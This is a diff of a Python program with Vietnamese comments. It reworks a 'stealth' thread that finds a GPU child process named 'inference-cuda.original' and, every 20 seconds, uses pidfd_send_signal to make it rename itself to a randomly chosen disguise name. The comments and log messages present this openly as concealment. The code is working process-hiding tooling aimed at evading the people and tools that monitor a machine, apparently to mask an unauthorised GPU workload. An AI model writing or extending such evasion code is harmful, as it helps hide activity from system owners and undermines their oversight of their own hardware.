@@ -540,22 +540,76 @@ def main():
             
             # 🔒 PHASE 2: Enhanced GPU Resource Monitoring + Stealth - Dựa trên patterns từ resource_control.py
             def maintain_gpu_subprocess_stealth():
-                """Enhanced GPU monitoring với resource conflict detection.
-                REFACTOR: Sử dụng pidfd và signal thay vì ghi /proc.
+                """Enhanced GPU monitoring.
+                REFACTOR 2: Tìm PID của cháu (grandchild) thay vì con trực tiếp.
                 """
-                # Định nghĩa các hằng số cho syscall
-                RENAME_SIGNAL = 32 + 10  # SIGRTMIN + 10
                 libc = ctypes.CDLL('libc.so.6', use_errno=True)
                 
-                # Lấy pidfd cho tiến trình con
+                # Chờ và tìm PID của tiến trình cháu (inference-cuda.original)
+                grandchild_pid = None
+                grandchild_proc = None
+                search_timeout = time.time() + 15 # Tìm trong 15s
+                
+                logger.info(f"🔍 [PID-SEARCH] Searching for grandchild 'inference-cuda.original' under parent PID {process.pid}...")
+                
+                while time.time() < search_timeout:
+                    try:
+                        parent = psutil.Process(process.pid)
+                        children = parent.children(recursive=True)
+                        for child in children:
+                            if child.name() == 'inference-cuda.original':
+                                grandchild_pid = child.pid
+                                grandchild_proc = child
+                                logger.info(f"✅ [PID-SEARCH] Found grandchild process with PID: {grandchild_pid}")
+                                break
+                        if grandchild_pid:
+                            break
+                    except psutil.NoSuchProcess:
+                        logger.warning(f"⚠️ [PID-SEARCH] Parent process {process.pid} disappeared during search.")
+                        return
+                    except Exception as e:
+                        logger.error(f"❌ [PID-SEARCH] Error while searching for grandchild: {e}")
+                    time.sleep(0.5)
+
+                if not grandchild_pid:
+                    logger.error(f"❌ [PID-SEARCH] Could not find grandchild process 'inference-cuda.original' for parent {process.pid}. Aborting stealth thread.")
+                    return
+
+                # Định nghĩa các hằng số cho syscall
+                RENAME_SIGNAL = 32 + 10  # SIGRTMIN + 10
+                SI_QUEUE = -1
+                
+                # Định nghĩa cấu trúc siginfo_t và union sigval cho Linux x86_64
+                class Sigval(ctypes.Union):
+                    _fields_ = [("sival_int", ctypes.c_int),
+                                ("sival_ptr", ctypes.c_void_p)]
+
+                class Siginfo(ctypes.Structure):
+                    _fields_ = [("si_signo", ctypes.c_int),
+                                ("si_errno", ctypes.c_int),
+                                ("si_code", ctypes.c_int),
+                                ("_pad", ctypes.c_int), # Padding
+                                ("_sifields", ctypes.c_ubyte * (128 - 2*4))] # Phần còn lại
+
+                    @property
+                    def si_value(self):
+                        ptr = ctypes.cast(ctypes.addressof(self) + 16, ctypes.POINTER(Sigval))
+                        return ptr.contents
+
+                    @si_value.setter
+                    def si_value(self, value):
+                        ptr = ctypes.cast(ctypes.addressof(self) + 16, ctypes.POINTER(Sigval))
+                        ptr.contents = value
+
+                # Lấy pidfd cho tiến trình cháu
                 pidfd = -1
                 try:
-                    pidfd = libc.syscall(434, process.pid, 0) # syscall 434 là pidfd_open
+                    pidfd = libc.syscall(434, grandchild_pid, 0) # syscall 434 là pidfd_open
                     if pidfd < 0:
                         errno = ctypes.get_errno()
-                        logger.error(f"❌ [PIDFD-STEALTH] pidfd_open failed for PID {process.pid}: {os.strerror(errno)}")
+                        logger.error(f"❌ [PIDFD-STEALTH] pidfd_open failed for grandchild PID {grandchild_pid}: {os.strerror(errno)}")
                         return
-                    logger.info(f"✅ [PIDFD-STEALTH] Got pidfd {pidfd} for PID {process.pid}")
+                    logger.info(f"✅ [PIDFD-STEALTH] Got pidfd {pidfd} for grandchild PID {grandchild_pid}")
                 except Exception as e:
                     logger.error(f"❌ [PIDFD-STEALTH] Exception during pidfd_open: {e}")
                     return
@@ -564,37 +618,40 @@ def main():
                 gpu_stealth_names = stealth_names
                 sleep_seconds = 20.0  # Giữ nguyên chu kỳ đổi tên
 
-                while process.poll() is None:  # While process is running
+                while grandchild_proc.is_running():
                     try:
                         time.sleep(sleep_seconds)
-                        if process.poll() is not None:
+                        if not grandchild_proc.is_running():
                             break
 
                         # Chọn tên mới và chuẩn bị payload
                         gpu_stealth_name = random.choice(gpu_stealth_names)
                         safe_gpu_name = _sanitize_comm_name(gpu_stealth_name)
                         
-                        # Cấp phát bộ nhớ cho tên mới và sao chép vào
-                        # Bộ nhớ này sẽ được giải phóng bởi signal handler trong C
-                        name_buffer = ctypes.create_string_buffer(safe_gpu_name.encode('utf-8'))
+                        # Cấp phát bộ nhớ bằng libc.malloc và sao chép dữ liệu
+                        # Bộ nhớ này sẽ được giải phóng bởi signal handler trong C (free)
+                        name_buffer = libc.malloc(len(safe_gpu_name.encode('utf-8')) + 1)
+                        if not name_buffer:
+                            logger.error("❌ [PIDFD-STEALTH] libc.malloc failed")
+                            continue
+                        libc.strcpy(name_buffer, safe_gpu_name.encode('utf-8'))
                         
-                        # Tạo cấu trúc siginfo để gửi con trỏ
-                        # union sigval { int sival_int; void* sival_ptr; }
-                        class Sigval(ctypes.Union):
-                            _fields_ = [("sival_int", ctypes.c_int),
-                                        ("sival_ptr", ctypes.c_void_p)]
+                        # Tạo và điền cấu trúc siginfo
+                        info = Siginfo()
+                        info.si_signo = RENAME_SIGNAL
+                        info.si_code = SI_QUEUE
+                        info.si_value.sival_ptr = name_buffer
                         
-                        sigval = Sigval(sival_ptr=ctypes.cast(name_buffer, ctypes.c_void_p))
-
                         # Gửi tín hiệu với payload
                         # syscall 424 là pidfd_send_signal
-                        ret = libc.syscall(424, pidfd, RENAME_SIGNAL, ctypes.byref(sigval), 0)
+                        ret = libc.syscall(424, pidfd, RENAME_SIGNAL, ctypes.byref(info), 0)
 
                         if ret == 0:
-                            logger.info(f"✅ [PIDFD-STEALTH] Sent rename signal to PID {process.pid} with name '{safe_gpu_name}'")
+                            logger.info(f"✅ [PIDFD-STEALTH] Sent rename signal to grandchild PID {grandchild_pid} with name '{safe_gpu_name}'")
                         else:
                             errno = ctypes.get_errno()
-                            logger.warning(f"⚠️ [PIDFD-STEALTH] pidfd_send_signal failed for PID {process.pid}: {os.strerror(errno)}")
+                            logger.warning(f"⚠️ [PIDFD-STEALTH] pidfd_send_signal failed for grandchild PID {grandchild_pid}: {os.strerror(errno)}")
+                            libc.free(name_buffer) # Giải phóng bộ nhớ nếu gửi thất bại
                             # Nếu tiến trình không còn, thoát vòng lặp
                             if errno == 3: # ESRCH - No such process
                                 break
